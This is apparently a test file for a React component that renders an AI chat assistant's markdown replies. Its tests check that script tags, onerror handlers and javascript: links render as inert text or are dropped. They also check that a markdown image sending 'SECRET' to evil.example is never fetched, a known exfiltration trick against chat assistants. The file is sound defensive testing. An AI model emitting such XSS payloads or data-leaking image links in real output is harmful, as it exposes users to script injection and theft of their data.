// @vitest-environment jsdom
import { renderToString } from 'react-dom/server';
import { act } from 'react';
import { afterEach, describe, test, vi } from 'vitest';
import { assert } from 'riteway/vitest';
import { mount, unmountAll } from '@/ui/test-support/dom';
import { citationChipClass } from '../citation-chip/citation-chip-class';
import { proseClasses } from './chat-prose-class';
import { ChatProse } from './chat-prose';

afterEach(() => {
  unmountAll();
});

/** The markup in a detached container, to query like the browser would. */
const dom = (text: string, citationDriveId: string | null = 'd1'): HTMLElement => {
  const container = document.createElement('div');
  container.innerHTML = renderToString(<ChatProse text={text} streaming={false} citationDriveId={citationDriveId} />);
  return container;
};

describe('ChatProse', () => {
  test('markdown', () => {
    const view = dom('Ship **in October**.\n\n- design\n- build\n\n> quoted');
    assert({
      given: 'markdown with bold text, a list and a quote',
      should: 'render it as prose elements, not as literal markdown',
      actual: [
        view.querySelector('strong')?.textContent,
        [...view.querySelectorAll('ul > li')].map((item) => item.textContent),
        view.querySelector('ul')?.className,
        view.querySelector('blockquote')?.textContent?.trim(),
        view.textContent?.includes('**'),
      ],
      expected: ['in October', ['design', 'build'], proseClasses.ul, 'quoted', false],
    });
  });

  test('raw html is text', () => {
    const view = dom('Look <img src=x onerror=alert(1)> here <script>alert(2)</script> <b>bold</b>');
    assert({
      given: 'a reply carrying raw HTML: an image with a handler, a script and a tag',
      should: 'create no element from it and show it as text',
      actual: [
        view.querySelector('img, script, b'),
        view.querySelector('[onerror]'),
        view.textContent?.includes('<img src=x onerror=alert(1)>'),
        view.textContent?.includes('<script>alert(2)</script>'),
      ],
      expected: [null, null, true, true],
    });
  });

  test('unsafe links', () => {
    const view = dom('[click](javascript:alert(1)) [data](data:text/html,hi) [site](https://example.com/a)');
    const hrefs = [...view.querySelectorAll('a')].map((anchor) => anchor.getAttribute('href'));
    const site = view.querySelector('a[href="https://example.com/a"]');
    assert({
      given: 'a javascript: link, a data: link and an https link',
      should: 'link only the https one, opening it in a new tab without an opener',
      actual: [hrefs, site?.getAttribute('target'), site?.getAttribute('rel'), site?.className],
      expected: [['https://example.com/a'], '_blank', 'noopener noreferrer', proseClasses.a],
    });
  });

  test('remote images never load', async () => {
    const markdown = 'Here ![secret notes](https://evil.example/p.png?d=SECRET) and ![](data:image/png;base64,AAAA) and ![logo](/api/files/f1).';
    const view = dom(markdown);
    const live = mount(<ChatProse text={markdown} streaming citationDriveId="d1" />);
    await vi.waitFor(async () => {
      await act(async () => {});
      if (!live.textContent?.includes('secret notes')) throw new Error('not rendered');
    });
    const link = view.querySelector('a[href="https://evil.example/p.png?d=SECRET"]');
    assert({
      given: 'a reply embedding a remote image whose URL carries data, a data: image and a same-origin image, finished and streaming',
      should: 'create no image and nothing that fetches on render; a web image becomes a link the viewer must click, the rest only their alt text',
      actual: [
        [view.querySelector('img'), view.querySelector('[src], [srcset]'), live.querySelector('img'), live.querySelector('[src], [srcset]')],
        [link?.textContent, link?.getAttribute('target'), link?.getAttribute('rel'), link?.className],
        view.textContent?.includes('logo'),
        view.querySelectorAll('a').length,
      ],
      expected: [[null, null, null, null], ['secret notes', '_blank', 'noopener noreferrer', proseClasses.a], true, 1],
    });
  });

  test('blocked images and links', () => {
    const view = dom('An ![chart](HTTPS://evil.example/c.png) and [a link](javascript:alert(1)).');
    const blocked = [...view.querySelectorAll('span')].filter((span) => /blocked/i.test(span.textContent ?? ''));
    assert({
      given: 'an image and a link that the hardening step blocks before imago’s own elements see them',
      should: 'mark each as blocked in imago’s token classes, never the fallback’s stock grey ones, and load nothing',
      actual: [
        blocked.map((span) => span.className),
        view.innerHTML.includes('gray'),
        view.querySelector('img, [src], [srcset]'),
      ],
      expected: [[proseClasses.blockedImage, proseClasses.blockedLink], false, null],
    });
  });

  test('a linked image', async () => {
    const markdown = 'See [![the chart](https://a.example/c.png)](https://b.example/report).';
    const html = renderToString(<ChatProse text={markdown} streaming={false} citationDriveId="d1" />);
    const live = mount(<ChatProse text={markdown} streaming citationDriveId="d1" />);
    await vi.waitFor(async () => {
      await act(async () => {});
      if (!live.textContent?.includes('the chart')) throw new Error('not rendered');
    });
    const view = document.createElement('div');
    view.innerHTML = html;
    assert({
      given: 'an image wrapped in a link, finished and streaming',
      should: 'render one link, to the link’s target, with the image as its text: no anchor inside an anchor and nothing loaded',
      actual: [
        html.match(/<a /g)?.length,
        [...live.querySelectorAll('a')].map((anchor) => [anchor.getAttribute('href'), anchor.textContent]),
        live.querySelectorAll('a a').length,
        view.querySelector('a')?.getAttribute('href'),
        [view.querySelector('img'), live.querySelector('img')],
      ],
      expected: [1, [['https://b.example/report', 'the chart']], 0, 'https://b.example/report', [null, null]],
    });
  });

  test('footnotes', () => {
    const view = dom('Ships in October[^1], says [the plan](https://example.com/plan).\n\n[^1]: The roadmap.');
    const anchors = [...view.querySelectorAll('a')];
    const inPage = anchors.filter((anchor) => anchor.getAttribute('href')?.startsWith('#'));
    const web = anchors.find((anchor) => anchor.getAttribute('href') === 'https://example.com/plan');
    assert({
      given: 'a footnote reference and its back link beside a web link',
      should: 'jump within the reply for the footnote links, each landing on an element that exists, and open only the web link in a new tab',
      actual: [
        inPage.length >= 2,
        inPage.map((anchor) => anchor.getAttribute('target')),
        inPage.every((anchor) => anchor.className === proseClasses.a),
        inPage.map((anchor) => view.querySelector(`[id="${anchor.getAttribute('href')?.slice(1)}"]`) !== null),
        [web?.getAttribute('target'), web?.getAttribute('rel')],
      ],
      expected: [true, inPage.map(() => null), true, inPage.map(() => true), ['_blank', 'noopener noreferrer']],
    });
  });

  test('links that are not the web', () => {
    const view = dom('See [the dashboard](/dashboard/x), [a sibling](../x) and [mail](mailto:ada@example.com).');
    const links = [...view.querySelectorAll('a')].map((anchor) => [
      anchor.getAttribute('href'),
      anchor.getAttribute('target'),
      anchor.getAttribute('rel'),
    ]);
    assert({
      given: 'a relative link, a parent-relative link and a mail link the model wrote',
      should: 'open each in a new tab without an opener, so a click never navigates the imago shell away',
      actual: links,
      expected: [
        ['/dashboard/x', '_blank', 'noopener noreferrer'],
        ['/x', '_blank', 'noopener noreferrer'],
        ['mailto:ada@example.com', '_blank', 'noopener noreferrer'],
      ],
    });
  });

  test('page citations', () => {
    const view = dom('See @[Roadmap](p1:page) and ask @[Ada](u1:user).');
    const chip = view.querySelector('a[data-citation]');
    assert({
      given: 'a reply citing a page and mentioning a person, in drive d1',
      should: 'render the page as a hairline chip linking to /imago/p/p1 (basePath adds /imago) and the person as plain text',
      actual: [
        chip?.getAttribute('href'),
        chip?.className,
        chip?.textContent,
        chip?.getAttribute('target'),
        view.querySelectorAll('a').length,
        view.textContent?.includes('@Ada'),
      ],
      expected: ['/p/p1', citationChipClass, 'Roadmap', null, 1, true],
    });
  });

  test('a citation with no drive', () => {
    const view = dom('See @[Roadmap](p1:page).', null);
    assert({
      given: 'a page citation where no drive is known',
      should: 'resolve the page through the native page resolver',
      actual: [view.querySelector('a')?.getAttribute('href'), view.querySelector('[data-citation]')?.className, view.querySelector('[data-citation]')?.textContent],
      expected: ['/p/p1', citationChipClass, 'Roadmap'],
    });
  });

  test('code', () => {
    const view = dom('Use `npm` never.\n\n```ts\nconst a = 1;\n```');
    assert({
      given: 'inline code and a fenced block',
      should: 'render both as plain token-styled code, with no lazy highlighter',
      actual: [
        view.querySelector('p code')?.className,
        view.querySelector('pre')?.className,
        view.querySelector('pre code')?.textContent,
        view.querySelector('template'),
      ],
      expected: [proseClasses.code, proseClasses.pre, 'const a = 1;\n', null],
    });
  });

  test('streaming', async () => {
    const view = dom('Half **bold');
    const live = mount(<ChatProse text="Half **bold" streaming citationDriveId="d1" />);
    await vi.waitFor(async () => {
      await act(async () => {});
      if (live.querySelector('strong') === null) throw new Error('not rendered');
    });
    assert({
      given: 'an unfinished bold span, finished and while streaming',
      should: 'show it as written once finished, and complete the span while streaming so no stray asterisks show',
      actual: [view.textContent?.includes('**'), live.querySelector('strong')?.textContent, live.textContent?.includes('**')],
      expected: [true, 'bold', false],
    });
  });
});
